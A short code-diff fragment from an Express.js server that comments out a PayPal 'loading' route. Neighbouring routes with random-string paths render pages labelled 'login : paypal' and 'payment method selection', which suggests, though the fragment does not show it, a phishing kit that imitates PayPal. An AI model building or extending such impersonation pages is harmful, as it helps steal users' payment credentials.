@@ -3534,11 +3534,11 @@ app.get("/blaTxmdM9HwCP472fgsut", (req, res) => { // payment method selection
 });
 
 
-// paypal
-app.get("/loadinghpp", (req, res) => { // loading 1: paypal
-  const { time, url } = req.query;
-  res.render("loadpaypo", { url, time });
-});
+// // paypal
+// app.get("/loadinghpp", (req, res) => { // loading 1: paypal
+//   const { time, url } = req.query;
+//   res.render("loadpaypo", { url, time });
+// });
 
 app.get("/HlX3xzdM2SwoPR72Fg5JL", (req, res) => { // login : paypal
   res.render("logipaypo");
